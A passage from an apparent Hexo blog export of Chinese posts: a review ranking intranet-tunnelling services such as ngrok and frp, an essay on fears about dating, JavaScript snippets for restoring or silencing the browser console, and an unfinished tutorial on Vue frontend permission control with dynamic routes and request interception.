<h2 id="网云穿"><a href="#网云穿" class="headerlink" title="网云穿"></a>网云穿</h2><p><a href="https://www.xiaomy.net/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827134553939.png" alt="image-20220827134553939"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：网站界面清晰明了，有免费套餐</li>
<li>缺点：手机号注册，免费套餐<strong>限流量</strong>，支持架构不多</li>
</ul>
<h2 id="行云管家"><a href="#行云管家" class="headerlink" title="行云管家"></a>行云管家</h2><p><a href="https://www.cloudbility.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827135348518.png" alt="image-20220827135348518"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：界面清爽</li>
<li>缺点：需要手机号注册，<strong>无免费套餐</strong></li>
</ul>
<h2 id="nat123"><a href="#nat123" class="headerlink" title="nat123"></a>nat123</h2><p><a href="http://www.nat123.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827172553640.png" alt="image-20220827172553640"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：信誉保障，支持架构多，教程完善，有免费套餐，不需要手机号注册</li>
<li>缺点：界面不太美观，需要实名</li>
</ul>
<h2 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h2><p><a href="https://ngrok.com/">链接-En</a></p>
<p><img src="https://cdn.huatree.top/image-20220827173225022.png" alt="image-20220827173225022"></p>
<p><a href="https://www.ngrok.cc/">链接-Cn</a></p>
<p><img src="https://cdn.huatree.top/image-20220827173341410.png" alt="image-20220827173341410"></p>
<p><strong>简评</strong>:</p>
<ul>
<li><p>优点：第一种有免费套餐，支持架构多，<strong>不限流量</strong>，<strong>国外网站不需要手机号注册</strong>，</p>
<p>第二种有免费套餐，<strong>不限流量</strong>，不需要手机号注册，<strong>端口不会变</strong></p>
</li>
<li><p>缺点：<del>第一种对英文不够用的同学不太友好</del>，</p>
</li>
</ul>
<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p><a href="https://github.com/fatedier/frp">链接-开源</a></p>
<p><img src="https://cdn.huatree.top/image-20220827173803114.png" alt="image-20220827173803114"></p>
<p><a href="https://www.natfrp.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827173902124.png" alt="image-20220827173902124"></p>
<p><strong>简评</strong>:</p>
<ul>
<li><p>优点：第一种开源，维护多，自持自定义，<strong>完全免费</strong>，<strong>无需注册</strong>；</p>
<p>第二种有免费套餐，五条映射线路，不需要手机号注册，自带更新程序，支持架构多，可以刷路由器；</p>
</li>
<li><p>缺点：第一种使用不便；</p>
<p>第二种<strong>限流量</strong>，教程有点乱</p>
</li>
</ul>
<h2 id="神卓"><a href="#神卓" class="headerlink" title="神卓"></a>神卓</h2><p><a href="https://www.shenzhuohl.com/index.html">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827174345658.png" alt="image-20220827174345658"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：有免费套餐，<strong>不限流量</strong></li>
<li>缺点：免费版适用于稳定性稍低的测试,限时 3 天，手机号注册</li>
</ul>
<h2 id="飞鸽"><a href="#飞鸽" class="headerlink" title="飞鸽"></a>飞鸽</h2><p><a href="https://www.fgnwct.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827175114345.png" alt="image-20220827175114345"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：有免费套餐，网站界面简洁，支持<code>Mips</code>、群辉等架构，可以刷路由器，注册不需要手机号</li>
<li>缺点：免费套餐<strong>限流量</strong></li>
</ul>
<h2 id="闪库"><a href="#闪库" class="headerlink" title="闪库"></a>闪库</h2><p><a href="http://www.ipyingshe.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827175326441.png" alt="image-20220827175326441"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：界面做的好看</li>
<li>缺点：注册需要客户端，没有使用教程，版本架构支持的少，<strong>文件偏大</strong></li>
</ul>
<h2 id="ZeroTier"><a href="#ZeroTier" class="headerlink" title="ZeroTier"></a>ZeroTier</h2><p><a href="https://www.zerotier.com/">链接</a></p>
<p><img src="https://cdn.huatree.top/image-20220827180129848.png" alt="image-20220827180129848"></p>
<p><strong>简评</strong>:</p>
<ul>
<li>优点：有免费套餐，<strong>国外公网不限流量</strong>，支持架构多，不需要手机号注册</li>
<li>缺点：<del>对英文不够用的同学不太友好</del></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人推荐：<code>cpolar</code> &gt; <code>ngrok</code> &gt; <code>神卓</code> &gt; <code>natapp</code> &gt; <code>frp</code> &gt; <code>网云穿</code> &gt; <code>ZeroTier</code></p>
<p>因为上述的基本都免流量，这才是使用最舒服的点，至于钞能力用户：<code>花生壳</code> &gt; <code>网云穿</code> &gt; <code>行云管家</code> &gt; <code>nat123</code> &gt; <code>其他</code></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://juejin.cn/post/7066652480674725925">内网穿透软件推荐</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>你不敢谈恋爱的原因，是这些么</title>
    <url>/2022/08/29/20220829-%E4%BD%A0%E4%B8%8D%E6%95%A2%E8%B0%88%E6%81%8B%E7%88%B1%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E6%98%AF%E8%BF%99%E4%BA%9B%E4%B9%88/</url>
    <content><![CDATA[<p>恋爱，是勇敢者的游戏！你怕的那么多，就是不怕错过那个人！还是羡慕别人甜甜的恋爱吧！</p>
<p><img src="https://cdn.huatree.top/image-20220829233605212.png" alt="image-20220829233605212"></p>
<span id="more"></span>

<h2 id="解惑"><a href="#解惑" class="headerlink" title="解惑"></a>解惑</h2><p>这几天不断总结反思，发现了大家不敢恋爱的原因如下：</p>
<h3 id="骗子"><a href="#骗子" class="headerlink" title="骗子"></a>骗子</h3><p>杀猪盘的层出不穷，让很多人见识到，骗子无处不在，所以不再敢信任任何人；</p>
<h3 id="过往经历"><a href="#过往经历" class="headerlink" title="过往经历"></a>过往经历</h3><p>过往差劲的交往经历，出现过出轨、背叛、小三、谎言等行为，让人出现 PTSD，虽然很渴望感情，但是很怕再受伤；</p>
<h3 id="有毒关系"><a href="#有毒关系" class="headerlink" title="有毒关系"></a>有毒关系</h3><p>从未被正确的恋爱观影响过，就遇到了 npd、回避型、冷暴力、PUA、煤气灯效应等精神虐待，内心创伤无法恢复；</p>
<h3 id="付出和回报不成正比"><a href="#付出和回报不成正比" class="headerlink" title="付出和回报不成正比"></a>付出和回报不成正比</h3><p>前度的交往中，付出过很多，但遇人不淑从未被给予同等的精神、物质的回馈，再也不信爱情；</p>
<h3 id="自卑"><a href="#自卑" class="headerlink" title="自卑"></a>自卑</h3><p>总觉得自己不够完美，同别人比起来，身材不够好，容貌不够美，不够有才华，不够有钱等，觉得自己价值感很低，不配被爱；</p>
<h3 id="归因错误"><a href="#归因错误" class="headerlink" title="归因错误"></a>归因错误</h3><p>结束一段关系后，明明是对方的错误，过度反思归因为自己识人不清，待人太好太天真，于是出现极端的行为，认为世上无好人，对任何人都防备心拉满；</p>
<h3 id="无解决问题的能力"><a href="#无解决问题的能力" class="headerlink" title="无解决问题的能力"></a>无解决问题的能力</h3><p>交往，即意味着有很多问题要共同面对，世上很多事情，都可以通过深度的沟通来解决，但本身无解决问题的能力，认为所有困难都无法解决，无视沟通的重要性，从而导致关系破裂，验证自己的理论——看，事情无法被解决；</p>
<h3 id="悲观，认为所有感情都将走向分手"><a href="#悲观，认为所有感情都将走向分手" class="headerlink" title="悲观，认为所有感情都将走向分手"></a>悲观，认为所有感情都将走向分手</h3><p>不管是主动，还是被动的接收到一个结论，认为感情的终点都是悲剧。不相信感情能被经营好，同时也不信自己和对方都有经营感情的能力；</p>
<h3 id="没有爱的能力"><a href="#没有爱的能力" class="headerlink" title="没有爱的能力"></a>没有爱的能力</h3><p>在一段感情中，大家都需要爱和被爱，被爱时感觉很幸福，然而一想到要爱别人，就认为付出不会被认可，主动选择后退；</p>
<h3 id="现实层面的差距"><a href="#现实层面的差距" class="headerlink" title="现实层面的差距"></a>现实层面的差距</h3><p>当客观条件低于对方时，看不到自身吸引对方的优势，而感觉到现实的压力巨大，不敢面对从而选择逃跑；</p>
<h3 id="三分钟热度"><a href="#三分钟热度" class="headerlink" title="三分钟热度"></a>三分钟热度</h3><p>无法长久的专注一件事&#x2F;一个人，对任何事和任何人都有兴趣，但新鲜感一过，就失去兴趣；</p>
<h3 id="你来补充吧"><a href="#你来补充吧" class="headerlink" title="你来补充吧~~"></a>你来补充吧~~</h3><p>爱，是一种高级情感。弥足珍贵而鲜有少见，需要被珍视。</p>
<p>它能反馈出勇气、认知、自信、专注、乐观、智慧、美好等品质，被人艳羡；</p>
<p>但也最奢侈，在悲观、懦弱、伤害、后退、回避、无知中，被无端消亡！</p>
<h2 id="最后的提炼"><a href="#最后的提炼" class="headerlink" title="最后的提炼"></a>最后的提炼</h2><p>我一直很困惑，大家都想找对象，为啥找不到。</p>
<ol>
<li><p>好看的，怕被外表迷惑，怕被骗！丑的，看不上！</p>
</li>
<li><p>慢慢来，怕是养鱼的；快的，又怕目的性太强，是短择；</p>
</li>
<li><p>年纪小的，怕不稳定不成熟；年纪大的，又怕别人太复杂，对付不了；</p>
</li>
<li><p>富的，怕高攀不起，也怕别人是拿钱钓自己；穷的，觉得没未来；</p>
</li>
<li><p>见面，怕见光死，怕遇骗子，怕人有其他意图；不见面，怕是杀猪盘，怕是一场空；</p>
</li>
<li><p>学历高，怕别人高傲看不起自己；学历低，怕对方素质不行；</p>
</li>
<li><p>网络，怕是包装的人设，怕不真实；现实，唯唯诺诺不敢接触，怕尴尬；</p>
</li>
<li><p>主动，怕自己掉价，怕没有面子，怕暴露需求感；不主动，觉得没诚意，怕误解别人心意；</p>
</li>
<li><p>在意的，怕不是双向喜欢，怕自己一厢情愿；不在意的，根本不想理；</p>
</li>
<li><p>算球！！！还是单身吧！</p>
</li>
</ol>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>情感解惑</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器console控制台的开启与屏蔽console</title>
    <url>/2022/09/03/20220903-%E6%B5%8F%E8%A7%88%E5%99%A8console%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E5%BC%80%E5%90%AF%E4%B8%8E%E5%B1%8F%E8%94%BDconsole/</url>
    <content><![CDATA[<p>是 FCC 造成的问题，很显然 FCC 里的 console 覆盖了浏览器里原生的 console。排除项目中自己写的 code，那么剩下的必定真相：引入的 JS 脚本中屏蔽掉了 console。</p>
<span id="more"></span>

<h2 id="开启-console"><a href="#开启-console" class="headerlink" title="开启 console"></a>开启 console</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;(<span class="keyword">function</span> <span class="title function_">setConsole</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>)</span><br><span class="line">  iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe)</span><br><span class="line">  <span class="variable language_">console</span> = iframe.<span class="property">contentWindow</span>.<span class="property">console</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span> = <span class="variable language_">console</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h2 id="屏蔽-console"><a href="#屏蔽-console" class="headerlink" title="屏蔽 console"></a>屏蔽 console</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;(<span class="keyword">function</span> <span class="title function_">mask</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable language_">window</span> = globalThis</span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">exception</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">trace</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">info</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">log</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">warn</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">debug</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">error</span> = a</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">console</span>.<span class="property">table</span> = a</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>浏览器开发者工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue实现前端权限控制</title>
    <url>/2022/09/18/20220918-Vue%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%AB%AF%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<p>前端权限控制并不是新生事物，早在后端 MVC 时代，web 系统中就已经普遍存在对按钮和菜单的显示 &#x2F; 隐藏控制，只不过当时它们是由后端程序员在 jsp 或者 php 模板中实现的。</p>
<p><img src="https://cdn.huatree.top/image-20220918111400511.png" alt="image-20220918111400511"></p>
<span id="more"></span>

<h2 id="为什么需要做前端权限控制"><a href="#为什么需要做前端权限控制" class="headerlink" title="为什么需要做前端权限控制"></a>为什么需要做前端权限控制</h2><p>在实际项目中，前端权限控制也有其不可或缺的作用，主要体现为三点：</p>
<ol>
<li>提升突破权限的门槛；</li>
<li>过滤越权请求，减轻服务端压力；</li>
<li>提升用户体验。</li>
</ol>
<p>第一点可以理解为前端权限控制是系统安全的排头兵，虽然不是主力，但起码手动输 url、控制台发请求、开发者工具改数据这种级别的入侵可以防范掉；</p>
<p>第二点是为了省钱，不该发的请求干脆就让他发不出去，带宽都是钱买的；</p>
<p>第三点是从用户体验角度出发，一个设计优良的系统理应根据权限为每个用户展现特定的内容，避免在界面上给用户带来困扰，这是前端的本职工作，也是我个人做前端权限最大的动力之一。</p>
<h2 id="前端权限控制具体指什么"><a href="#前端权限控制具体指什么" class="headerlink" title="前端权限控制具体指什么"></a>前端权限控制具体指什么</h2><p>前端权限归根结底是请求的发起权，请求的发起可能由页面加载触发，也可能由页面上的按钮点击触发。</p>
<p>总的来说，所有的请求发起都触发自前端路由或视图，所以我们可以从这两方面入手，对触发权限的源头进行控制，最终要实现的目标是：</p>
<ol>
<li><p>路由方面，用户登录后只能看到自己有权访问的导航菜单，也只能访问自己有权访问的路由地址，否则将跳转 4xx 提示页；</p>
</li>
<li><p>视图方面，用户只能看到自己有权浏览的内容和有权操作的控件；</p>
</li>
<li><p>最后再加上请求控制作为最后一道防线，路由可能配置失误，按钮可能忘了加权限，这种时候请求控制可以用来兜底，越权请求将在前端被拦截。</p>
</li>
</ol>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>控制的第一步是知道用户拥有哪些权限，所以用户登录后第一件事是获取权限数据。</p>
<p>权限数据至少应该包括路由权限和资源权限。</p>
<h3 id="路由权限"><a href="#路由权限" class="headerlink" title="路由权限"></a>路由权限</h3><p>顾名思义，就是用户可访问的路由集合，以此作为设置前端路由和生成导航菜单的依据；资源权限是用户可访问的资源集合，“资源” 概念来自 RESTful 架构，如果对 “资源” 感到陌生也可以简单理解成用户能够发起的所有请求集合，以此作为视图控制和请求拦截的依据。</p>
<p>这里插入讲一下 “角色” 这个概念，可能有的系统会通过角色来做权限控制，我理解的角色就是特定几个资源打包后的快捷方式。</p>
<p>比如拥有总经理这个角色意味着拥有 a,b,c 这三个资源，副总经理就只有 b,c 两个资源，为用户赋予角色的本质是为用户赋予角色背后的资源。</p>
<p>引入角色这个概念的好处是，后台可以通过赋角色的方式，很方便的为某一类用户赋予特定的资源集合，而角色的作用应该仅限于此，尤其不应该将角色用做前端权限控制的依据，因为角色背后的资源权限是后端动态可配的。</p>
<p>我们也可以创建一个名字叫做 “总经理” 的角色，但其实一个资源都没有，所以前端应该始终关注资源权限本身，而只将角色视为用户的一个普通属性就好了。</p>
<p>有了权限数据下一步就是分别-实现对路由、视图、请求的控制。</p>
<h3 id="路由控制"><a href="#路由控制" class="headerlink" title="路由控制"></a>路由控制</h3><p>首先要实现动态菜单，这样就可以对常规访问方式进行限制；对于非常规访问方式比如手动修改 url，可以从前端路由处着手做控制。</p>
<p><strong>路由控制的思路有两种</strong>，一种是初始化即挂载全部路由，每次路由跳转前做校验；另一种是只挂载用户拥有的路由，相当于从源头上做了控制。</p>
<p>前者的缺点很明显，每次路由跳转都要做一遍校验是对计算资源的浪费，另外对于用户无权访问的路由，理论上就不应该挂载。</p>
<p>后者解决了上述问题，但仔细想这里存在一个悖论，要按需挂载路由就需要知道用户的路由权限，要知道用户的路由权限就需要用户先登录进来，但路由没有加载应用也没有初始化，用户从哪儿登录？</p>
<p>这里又可以有两种解决思路，一种是单独做一个登录页，登录后带着用户凭据跳转到前端应用；另一种是先初始化一个只有登录路由的应用，用户登录后动态添加路由，当然这需要框架提供支持。</p>
<h3 id="视图控制"><a href="#视图控制" class="headerlink" title="视图控制"></a>视图控制</h3><p>需要实现一个可以在视图层调用的权限验证方法，输入用户期望的权限，输出是否拥有该权限，将调用这个方法的结果，作为界面上需要验证权限的控件或元素显示与否的依据。</p>
<h3 id="请求控制"><a href="#请求控制" class="headerlink" title="请求控制"></a>请求控制</h3><p>实际上就是为你使用的 HTTP 库实现一个请求拦截器，对将要发起的请求与用户资源权限进行匹配，拦截越权请求。</p>
<p>这里值得一提的是对于携带参数的 url，需要先进行模式约定，比如&#x2F;people&#x2F;1 这个 url 可以在权限中描述为&#x2F;people&#x2F;**，那么拦截器中就要先将这种 url 处理成约定后的格式，然后再进行权限验证。</p>
<h2 id="基于-Vue-的权限控制实现方案"><a href="#基于-Vue-的权限控制实现方案" class="headerlink" title="基于 Vue 的权限控制实现方案"></a>基于 Vue 的权限控制实现方案</h2><p>到目前为止我们谈的都是脱离具体技术栈的实现思路，理论上可以用任何技术栈实现这个思路，这里我就在项目中介绍基于 Vue 实现的全部细节。</p>
<h3 id="贯穿流程"><a href="#贯穿流程" class="headerlink" title="贯穿流程"></a>贯穿流程</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/5ff85c7d01f06523ff52e4f73f9ec2f5.png" alt="image-5ff85c7d01f06523ff52e4f73f9ec2f5"></p>
<p>从第一步 “初始化 Vue 实例” 到 “获取权限数据” 之间做的其实是用户鉴权，这一步跟权限控制关系不大，怎么做都可以。</p>
<p>这里的做法是用户登录后获得一个 token，然后在请求 Headers 中设置 “Authorization”。token 会存进 sessionStorage 里，用户刷新将直接使用本地 token 授权，并重新获取权限数据，如果本地 token 失效，那么后端应该返回 401 状态码，前端跳回登陆界面。</p>
<p>从 “获取权限数据” 到 “异步加载路由组件” 之间做的是用户权限初始化，分别用 addRoutes()方法实现动态路由及菜单，实现全局权限验证方法及指令，以及实现 axios 请求拦截。</p>
<p>因为用的是动态路由方案，当动态路由注入时异步路由组件会开始加载，首次访问通常是加载首页组件，如果是用户刷新，地址栏还保留着之前浏览的的 url，那么动态路由注入后也会正确的加载对应的路由组件，显示对应的界面。</p>
<p>下面我们着重来看权限初始化部分的实现细节，因为所有的初始化操作都基于后端给的权限数据，所以我们先来约定权限数据的数据格式。</p>
<p><strong>路由权限数据是如下格式的对象数组</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">// 路由ID</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;菜单1&quot;</span><span class="punctuation">,</span> <span class="comment">// 路由名称</span></span><br><span class="line">      <span class="attr">&quot;parentId&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span> <span class="comment">// 父级路由名称</span></span><br><span class="line">      <span class="attr">&quot;route&quot;</span><span class="punctuation">:</span> <span class="string">&quot;route1&quot;</span> <span class="comment">// 路由地址</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;菜单1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;parentId&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;route&quot;</span><span class="punctuation">:</span> <span class="string">&quot;route1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>资源权限数据是如下格式的对象数组</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5ff85c7d01f06523ff52e4f73f9ec2f5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;账号-获取&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/accounts&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9lmv85ccf01f06523ff52e4f73f9ec24o&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;账号-获取&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/accounts&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DELETE&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="路由控制-1"><a href="#路由控制-1" class="headerlink" title="路由控制"></a>路由控制</h3><h4 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h4><p>最初实例化的路由里仅包含登录和 404 之类的基本路径，而我们期待完整的路由是这样的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> result = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/login.vue&#x27;</span>, resolve])</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/404&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;404&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/common/404.vue&#x27;</span>, resolve])</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;首页&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/index.vue&#x27;</span>, resolve])</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">       &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;/route1&#x27;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;菜单1&#x27;</span>,</span><br><span class="line">          <span class="attr">meta</span>: &#123;</span><br><span class="line">          <span class="attr">icon</span>: <span class="string">&#x27;icon-menu1&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/view1.vue&#x27;</span>, resolve])</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;/route2&#x27;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;菜单2&#x27;</span>,</span><br><span class="line">          <span class="attr">meta</span>: &#123;</span><br><span class="line">          <span class="attr">icon</span>: <span class="string">&#x27;icon-menu2&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/view2.vue&#x27;</span>, resolve])</span><br><span class="line">          <span class="attr">children</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">path</span>: <span class="string">&#x27;child2-1&#x27;</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;子菜单2-1&#x27;</span></span><br><span class="line">              <span class="attr">meta</span>: &#123;&#125;,</span><br><span class="line">              <span class="attr">component</span>: <span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">require</span>([<span class="string">&#x27;../views/route2-1.vue&#x27;</span>, resolve])</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/404&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>一级路由只增加了一个首页，以及最后兜底的 404，其他功能模块都作为首页的子路由，这么做主要是为了可以在首页实现全局导航菜单，实际项目中也可以调整这个路由结构。</p>
<p>下一步我们关注的重点应该是获取首页的子路由们，思路是事先在本地存一份整个项目的完整路由数据，根据用户的路由权限对完整路由进行筛选。<br>具体说一下筛选的实现，先将路由权限数据处理成如下结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hashMenus = &#123;</span><br><span class="line">  <span class="string">&#x27;/route1&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;/route1/route1-1&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;/route1/route1-2&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;/route2&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;...&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后遍历本地完整路由，在循环中将路径拼接成上述结构中的 key 格式，通过<code>hashMenus[route]</code>判断路由是否匹配。</p>
<p>如果你有更好的筛选方法，或者后端返回的路由权限数据与约定不同，也可以酌情修改这部分的逻辑，只要最终能得到可用的路由数据就可以。</p>
<p>注意在调用<code>addRoutes()</code>方法时，404 页面的模糊匹配一定要放在数组的最后，否则其后的路由都不会生效。</p>
<h4 id="动态菜单"><a href="#动态菜单" class="headerlink" title="动态菜单"></a>动态菜单</h4><p>用户的实际路由数据可以直接用来生成导航菜单，但首先有一个小问题，路由数据是在根组件中得到的，而导航菜单存在于首页组件中，我们需要用某种方式将菜单数据传递到首页。</p>
<p>方法有很多，考虑到菜单数据在整个用户会话过程中不会发生改变，而且除了生成菜单之外就没有其他共享价值了，所以这里就用了最简单直接的办法，把菜单数据挂在根组件上，在首页里用<code>this.$parent.menuData</code>获取。</p>
<p>另外，导航菜单很可能会有一些个性化需求，比如添加栏目图标，这可以通过在路由中添加 meta 数据实现，例如将图标 class 或 unicode 存到路由 meta 里，模板中就可以访问到 meta 数据，用来生成图标标签，类似的需求也都可以这样来做。</p>
<p>另一个问题可能在多角色系统中比较常遇到，就是当不同角色都有一个名字相同但功能不同的路由，会发生路由名称冲突。</p>
